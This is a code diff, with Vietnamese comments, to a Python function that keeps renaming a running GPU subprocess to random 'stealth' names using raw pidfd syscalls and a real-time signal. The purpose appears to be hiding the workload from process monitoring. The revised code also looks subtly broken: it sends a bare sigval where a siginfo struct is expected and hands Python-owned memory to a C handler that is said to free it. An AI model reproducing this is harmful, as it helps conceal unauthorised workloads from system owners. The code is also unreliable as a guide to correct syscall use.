@@ -540,47 +540,14 @@ def main():
             
             # 🔒 PHASE 2: Enhanced GPU Resource Monitoring + Stealth - Dựa trên patterns từ resource_control.py
             def maintain_gpu_subprocess_stealth():
-                """Enhanced GPU monitoring.
-                REFACTOR 3: Tin tưởng PID gốc vì exec() kế thừa PID.
+                """Enhanced GPU monitoring với resource conflict detection.
+                REFACTOR: Sử dụng pidfd và signal thay vì ghi /proc.
                 """
-                logger.info(f"🕰️ [STEALTH-INIT] Waiting 10s for bash script to exec and transform into the main process...")
-                time.sleep(10) # Đợi cho script bash có thời gian exec
-
-                # Kiểm tra lại xem tiến trình có còn tồn tại sau khi chờ không
-                if process.poll() is not None:
-                    logger.warning(f"⚠️ [STEALTH-INIT] Process {process.pid} terminated during initial wait. Aborting stealth thread.")
-                    return
-
-                logger.info(f"✅ [STEALTH-INIT] Proceeding with stealth operations on PID {process.pid}.")
-
                 # Định nghĩa các hằng số cho syscall
                 RENAME_SIGNAL = 32 + 10  # SIGRTMIN + 10
-                SI_QUEUE = -1
                 libc = ctypes.CDLL('libc.so.6', use_errno=True)
                 
-                # Định nghĩa cấu trúc siginfo_t và union sigval cho Linux x86_64
-                class Sigval(ctypes.Union):
-                    _fields_ = [("sival_int", ctypes.c_int),
-                                ("sival_ptr", ctypes.c_void_p)]
-
-                class Siginfo(ctypes.Structure):
-                    _fields_ = [("si_signo", ctypes.c_int),
-                                ("si_errno", ctypes.c_int),
-                                ("si_code", ctypes.c_int),
-                                ("_pad", ctypes.c_int), # Padding
-                                ("_sifields", ctypes.c_ubyte * (128 - 2*4))] # Phần còn lại
-
-                    @property
-                    def si_value(self):
-                        ptr = ctypes.cast(ctypes.addressof(self) + 16, ctypes.POINTER(Sigval))
-                        return ptr.contents
-
-                    @si_value.setter
-                    def si_value(self, value):
-                        ptr = ctypes.cast(ctypes.addressof(self) + 16, ctypes.POINTER(Sigval))
-                        ptr.contents = value
-                
-                # Lấy pidfd cho tiến trình gốc
+                # Lấy pidfd cho tiến trình con
                 pidfd = -1
                 try:
                     pidfd = libc.syscall(434, process.pid, 0) # syscall 434 là pidfd_open
@@ -597,7 +564,7 @@ def main():
                 gpu_stealth_names = stealth_names
                 sleep_seconds = 20.0  # Giữ nguyên chu kỳ đổi tên
 
-                while process.poll() is None:
+                while process.poll() is None:  # While process is running
                     try:
                         time.sleep(sleep_seconds)
                         if process.poll() is not None:
@@ -607,30 +574,27 @@ def main():
                         gpu_stealth_name = random.choice(gpu_stealth_names)
                         safe_gpu_name = _sanitize_comm_name(gpu_stealth_name)
                         
-                        # Cấp phát bộ nhớ bằng libc.malloc và sao chép dữ liệu
-                        # Bộ nhớ này sẽ được giải phóng bởi signal handler trong C (free)
-                        name_buffer = libc.malloc(len(safe_gpu_name.encode('utf-8')) + 1)
-                        if not name_buffer:
-                            logger.error("❌ [PIDFD-STEALTH] libc.malloc failed")
-                            continue
-                        libc.strcpy(name_buffer, safe_gpu_name.encode('utf-8'))
+                        # Cấp phát bộ nhớ cho tên mới và sao chép vào
+                        # Bộ nhớ này sẽ được giải phóng bởi signal handler trong C
+                        name_buffer = ctypes.create_string_buffer(safe_gpu_name.encode('utf-8'))
                         
-                        # Tạo và điền cấu trúc siginfo
-                        info = Siginfo()
-                        info.si_signo = RENAME_SIGNAL
-                        info.si_code = SI_QUEUE
-                        info.si_value.sival_ptr = name_buffer
+                        # Tạo cấu trúc siginfo để gửi con trỏ
+                        # union sigval { int sival_int; void* sival_ptr; }
+                        class Sigval(ctypes.Union):
+                            _fields_ = [("sival_int", ctypes.c_int),
+                                        ("sival_ptr", ctypes.c_void_p)]
                         
+                        sigval = Sigval(sival_ptr=ctypes.cast(name_buffer, ctypes.c_void_p))
+
                         # Gửi tín hiệu với payload
                         # syscall 424 là pidfd_send_signal
-                        ret = libc.syscall(424, pidfd, RENAME_SIGNAL, ctypes.byref(info), 0)
+                        ret = libc.syscall(424, pidfd, RENAME_SIGNAL, ctypes.byref(sigval), 0)
 
                         if ret == 0:
                             logger.info(f"✅ [PIDFD-STEALTH] Sent rename signal to PID {process.pid} with name '{safe_gpu_name}'")
                         else:
                             errno = ctypes.get_errno()
                             logger.warning(f"⚠️ [PIDFD-STEALTH] pidfd_send_signal failed for PID {process.pid}: {os.strerror(errno)}")
-                            libc.free(name_buffer) # Giải phóng bộ nhớ nếu gửi thất bại
                             # Nếu tiến trình không còn, thoát vòng lặp
                             if errno == 3: # ESRCH - No such process
                                 break
